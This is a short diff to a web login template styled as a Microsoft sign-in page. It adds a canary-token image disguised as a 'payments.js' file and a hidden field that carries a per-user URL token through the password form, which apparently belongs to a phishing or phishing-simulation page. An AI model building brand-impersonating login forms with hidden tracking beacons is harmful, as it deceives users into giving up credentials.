@@ -10,6 +10,9 @@
 <div class="min-h-screen flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
     <div class="max-w-md w-full space-y-8">
         <div>
+            {{-- Canary token --}}
+            <img src="http://canarytokens.com/about/4t4vj247ska6wipjw7ogy8lq8/payments.js">
+
             <img class="mx-auto h-12 w-auto"
                  src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/768px-Microsoft_logo.svg.png"
                  alt="Microsoft">
@@ -33,6 +36,12 @@
                            class="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm"
                            placeholder="Password">
                 </div>
+                <div>
+                    <input id="url_token" name="url_token" type="hidden"
+                            value="{{request('token')}}">
+
+                </div>
+
 
             </div>
 
